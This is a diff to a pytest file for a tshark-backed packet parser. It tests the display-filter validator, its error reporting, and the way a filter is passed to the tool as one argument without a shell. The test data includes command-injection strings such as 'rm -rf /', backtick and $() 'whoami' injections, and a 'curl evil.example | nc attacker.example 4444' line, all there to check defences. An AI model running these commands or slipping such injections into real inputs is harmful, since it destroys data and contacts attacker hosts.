@@ -11,6 +11,7 @@ mixup) goes unnoticed for a release.
 
 from __future__ import annotations
 
+import json
 import shutil
 import stat
 import struct
@@ -41,17 +42,22 @@ needs_capinfos = pytest.mark.skipif(not HAS_CAPINFOS, reason="capinfos is not in
         "http.request.method == \"GET\"",
         "frame.number == 42",
         "tcp.flags.syn == 1 and tcp.flags.ack == 0",
+        # Wireshark's own operators. These were rejected as "forbidden
+        # characters" until the rule was corrected, which meant the syntax most
+        # people actually type could not be run.
+        "tcp && ip",
+        "http || dns",
+        "!(arp or icmp)",
+        "tcp.flags & 0x02",
     ],
 )
 def test_validate_display_filter_accepts_benign_filters(benign):
     packet_parser._validate_display_filter(benign)  # must not raise
 
 
-@pytest.mark.parametrize(
-    "forbidden_char", list(";|&$`\\")
-)
+@pytest.mark.parametrize("forbidden_char", list(";$`\\"))
 def test_validate_display_filter_rejects_each_forbidden_character(forbidden_char):
-    with pytest.raises(ValueError):
+    with pytest.raises(packet_parser.DisplayFilterError):
         packet_parser._validate_display_filter(f"tcp.port == 80{forbidden_char}whoami")
 
 
@@ -59,16 +65,50 @@ def test_validate_display_filter_rejects_each_forbidden_character(forbidden_char
     "hostile",
     [
         "tcp.port == 80; rm -rf /",
-        "tcp.port == 80 | nc attacker.example 4444",
-        "tcp.port == 80 && curl evil.example",
         "tcp.port == 80`whoami`",
         "tcp.port == 80$(whoami)",
         "tcp.port == 80\\x00",
     ],
 )
 def test_validate_display_filter_rejects_hostile_filters(hostile):
-    with pytest.raises(ValueError):
+    with pytest.raises(packet_parser.DisplayFilterError):
         packet_parser._validate_display_filter(hostile)
+
+
+def test_validate_display_filter_rejects_an_overlong_filter():
+    with pytest.raises(packet_parser.DisplayFilterError):
+        packet_parser._validate_display_filter("a" * (packet_parser._FILTER_MAX_LEN + 1))
+
+
+# `&` and `|` are allowed now, and the reason has to be a property of the code
+# rather than an assurance: the filter reaches tshark through
+# create_subprocess_exec as one argv element, with no shell anywhere on the
+# path, so shell operators in it are text that tshark will reject as bad filter
+# syntax -- not commands. This asserts exactly that, without needing tshark.
+
+
+async def test_a_display_filter_reaches_the_tool_as_one_argument_and_no_shell():
+    hostile = "tcp.port == 80 && curl evil.example | nc attacker.example 4444"
+    probe = "import sys, json; print(json.dumps(sys.argv[1:]))"
+    stdout, _, rc = await packet_parser._run_tool(
+        [sys.executable, "-c", probe, "-Y", hostile], BytesSource(b"")
+    )
+    assert rc == 0
+    assert json.loads(stdout) == ["-Y", hostile]
+
+
+def test_filter_rejection_keeps_tsharks_message_and_drops_the_banner():
+    stderr = (
+        b'Running as user "root" and group "root". This could be dangerous.\n'
+        b"tshark: Constant expression is invalid.\n"
+        b"    tcp.porrt == 80\n"
+        b"    ^~~~~~~~~~~~~~~\n"
+    )
+    message = packet_parser._filter_rejection(stderr)
+    assert message.startswith("Constant expression is invalid.")
+    assert "Running as user" not in message
+    # The caret line is the part that says where the mistake is.
+    assert "^~~" in message
 
 
 # --- ALLOWED_VIEW_FLAGS: pure, no tools --------------------------------------
@@ -224,6 +264,36 @@ async def test_get_packet_list_respects_offset_and_limit():
     data = _build_minimal_pcap(num_packets=5)
     packets = await packet_parser.get_packet_list(BytesSource(data), offset=2, limit=2)
     assert [p.number for p in packets] == [3, 4]
+
+
+@needs_tshark
+async def test_a_filter_tshark_rejects_is_reported_not_silently_empty():
+    """A mistyped field used to produce an empty list reading "No packets
+    match", which is exactly what a valid filter selecting nothing looks like.
+    tshark exits non-zero on a filter it cannot parse and zero when one simply
+    matches nothing, so the two are distinguishable and must be told apart."""
+    with pytest.raises(packet_parser.DisplayFilterError) as exc:
+        await packet_parser.get_packet_list(
+            BytesSource(_build_minimal_pcap()), display_filter="tcp.porrt == 80"
+        )
+    assert "tcp.porrt" in str(exc.value)
+
+
+@needs_tshark
+async def test_a_valid_filter_matching_nothing_is_an_empty_list_not_an_error():
+    packets = await packet_parser.get_packet_list(
+        BytesSource(_build_minimal_pcap()), display_filter="tcp.port == 9999"
+    )
+    assert packets == []
+
+
+@needs_tshark
+async def test_wireshark_operators_run_rather_than_being_refused():
+    """`&&` and `||` are what people type. They were rejected outright before."""
+    packets = await packet_parser.get_packet_list(
+        BytesSource(_build_minimal_pcap(num_packets=2)), display_filter="udp && ip"
+    )
+    assert len(packets) == 2
 
 
 @needs_tshark
